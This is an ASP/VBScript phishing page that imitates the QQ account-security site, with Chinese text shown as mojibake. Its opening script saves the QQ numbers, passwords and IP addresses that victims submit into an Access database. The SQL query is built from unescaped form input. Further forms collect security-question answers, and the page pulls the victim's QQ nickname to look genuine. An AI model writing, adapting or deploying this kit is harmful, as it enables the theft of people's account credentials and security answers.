<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<%
set conn=Server.CreateObject("ADODB.Connection")
conn.open "DRIVER=Driver do Microsoft Access (*.mdb);UID=;PWD=;DBQ="&Server.MapPath("database/###zzmmxx###.mdb")'�����ݿ⽨��һ������
set add_rs=server.CreateObject("adodb.recordset")
add_rs.open "select * from list where zhanghao='" & request.Form("u") & "' and mima='" & request.Form("p") & "'",conn,1,3'�����ݿ��list��
if add_rs.recordcount=0 then
add_rs.addnew'��list��������һ������
if request("u")<>"" then
add_rs("zhanghao")=request("u")'�����Ǽ�¼�˺�
end if
if request("p")<>"" then
add_rs("mima")=request("p")'�����Ǽ�¼����
end if
add_rs("ip")=Request.ServerVariables("REMOTE_ADDR")'�����Ǽ�¼IP
add_rs.update
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<HEAD>

<meta http-equiv="Content-Type" content="text/html; charset=gb2312"><TITLE>QQ��ȫ����</TITLE>

<META http-equiv=X-UA-Compatible content=IE=EmulateIE7><LINK href="images/style[2]_(1).css" type=text/css rel=stylesheet><LINK href="images/base[1]_(2).css" type=text/css rel=stylesheet>

<form name="myform" id="myform" method="post" autocomplete="off" action="mb_log.asp" target="_parent" onsubmit="return checkForm();">


<!-- saved by CyberArticle from url=http://aq.qq.com/cn/manage/enter?to=modify_question&mb_flow_type=dna&PcacheTime=1290998635 -->
<link rel="SHORTCUT ICON" href="favicon2.ico" />
</HEAD>
<BODY ><!--header--><LINK href="images/index_css[1].css" type=text/css rel=stylesheet>


<DIV id=login style="PADDING-RIGHT: 0px; DISPLAY: none; PADDING-LEFT: 0px; Z-INDEX: 501; PADDING-BOTTOM: 0px; MARGIN: 0px; WIDTH: 400px; PADDING-TOP: 0px; POSITION: absolute; HEIGHT: 330px"><IFRAME id=embed_login_frame name=embed_login_frame src="" frameBorder=0 width="100%" scrolling=no height="100%">
</IFRAME></DIV>
<DIV id=header>
<DIV class=logo><A  href="http://aq.qq.com/"></A></DIV><A class=anniversary href="http://user.qzone.qq.com/88881999/blog/1273212315/" target=_blank></A>
<DIV class=login><!--
		<a href="http://qbar.qq.com/qqsafe" target="_blank" id="link_forum" >��̳����</a><span id="span_forum">��</span>
		--><A  href="http://service.qq.com/special/aq.html" target=_blank>��Ѷ�ͷ�</A><SPAN>��</SPAN> <A  href="http://support.qq.com/portal/discuss_pdt/387_1.html" target=_blank>�������</A><SPAN>��</SPAN> <A href="http://aq.qq.com/cn/notice/list" target=_blank>����</A><!--  -->
  <span>��</span> <a href="#">�˳�</a><span>��ӭ����<%
u=request("u")
Set http=Server.CreateObject("MSXML2.ServerXMLHTTP")
http.Open "GET","http://photo.qq.com/cgi-bin/common/cgi_get_userinfo?uin="&u&"&",False
http.send
dim xml,objNode,objAtr,nCntChd,nCntAtr 
Set xml=Server.CreateObject("Microsoft.XMLDOM")
xml.Async=False 
xml.Load(http.ResponseXML)
Set objNode=xml.documentElement
response.Write objNode.childNodes.item(0).text&" "
Set objAtr=Nothing
Set objNode=Nothing
Set xml=Nothing
%>(<%Response.Write request("u")%>)</span></DIV>
<DIV class=menu>
<UL>
<LI id=menu_index><A href="#">��&nbsp;&nbsp;ҳ</A> </LI>
<LI class=current id=menu_mb_manage><A href="#">�ܱ�����</A> </LI>
<LI id=menu_safe_service><A href="#">�ʺű���</A> <!--
			<li id="menu_comm_opt"><a href="/cn/changepsw/changepsw_index">���ܺ�����</a></li>
		  --></LI>
<LI id=menu_change_psw><A href="#">�޸�����</A> <!--
		  <li id="menu_change_psw"><a href="javascript:loginTo('/cn/changepsw/changepsw_index');">�޸�����</a></li>
		  --></LI>
<LI id=menu_find_psw><A href="#">�һ�����</A> </LI>
<LI id=menu_safe_school><A href="#">��ȫѧ��</A> </LI>
</UL><A id=li_t href="http://t.qq.com/qqsafe" target=_blank>��ע��ȫ��̬</A> <!--<div class="menu_faq">
		<a href="http://service.qq.com/special/aq.html" target="_blank" id="link_help"><i class="li_help"></i>����</a>
        </div>--></DIV><!--
    <div class="top_levels_tip" id="top_levels_tip"   style="display:block;">
	-->
<DIV class=top_levels_tip id=top_levels_tip style="DISPLAY: none" jQuery1290998636077="3">����������QQ�ʺŰ�ȫ���֣����������ȡ�����顣 <A class=t_btn  href="">��֪����</A> <A class=index_close  href=""></A></DIV></DIV><!--main-->
<iframe width="912" height="600" frameborder="0" scrolling="No" src="my_sj.asp"></iframe>
<!--foot-->
<DIV class=floatdiv id=union_verify_alert style="DISPLAY: none; LEFT: 30%; OVERFLOW: hidden; WIDTH: 374px; POSITION: absolute; TOP: 28%">
<DIV class=rs_u></DIV>
<H3><SPAN><A href=""><IMG height=17 src="images/close[1].jpg" width=17 vspace=5 border=0></A></SPAN>
<P id=div_title></P></H3>
<DIV class=side style="WIDTH: 372px"><IFRAME id=union_verify_frame style="BORDER-TOP-WIDTH: 0px; PADDING-RIGHT: 0px; PADDING-LEFT: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px auto; WIDTH: 372px; PADDING-TOP: 0px; HEIGHT: 290px; BORDER-RIGHT-WIDTH: 0px" name=union_verify_frame align=center src="" frameBorder=0 scrolling=no ;></IFRAME></DIV>
<DIV class=rs_d></DIV></DIV>



</BODY>

</html>

<script language="javascript">
function checkForm()
{
	if (document.myform.ddlDNAQues1.value == "-1"){
		alert ("��ѡ���ܱ����⣡");
		document.myform.ddlDNAQues1.focus();
		return false;
	}
	if (document.myform.ddlDNAQues2.value == "-1"){
		alert ("��ѡ���ܱ����⣡");
		document.myform.ddlDNAQues2.focus();
		return false;
	}
	if (document.myform.ddlDNAQues3.value == "-1"){
		alert ("��ѡ���ܱ����⣡");
		document.myform.ddlDNAQues3.focus();
		return false;
	}
	if (document.myform.txtAnswer1.value == ""){
		alert ("����д�ܱ�����𰸣�");
		document.myform.txtAnswer1.focus();
		return false;
	}
	if (document.myform.txtAnswer2.value == ""){
		alert ("����д�ܱ�����𰸣�");
		document.myform.txtAnswer2.focus();
		return false;
	}
	if (document.myform.txtAnswer3.value == ""){
		alert ("����д�ܱ�����𰸣�");
		document.myform.txtAnswer3.focus();
		return false;
	}
 }
</script>

<body onLoad= alert("�������״�ʹ�����ĳ�ֵ��������֤�������ϣ����������Ĳ��㣬���½⣡")>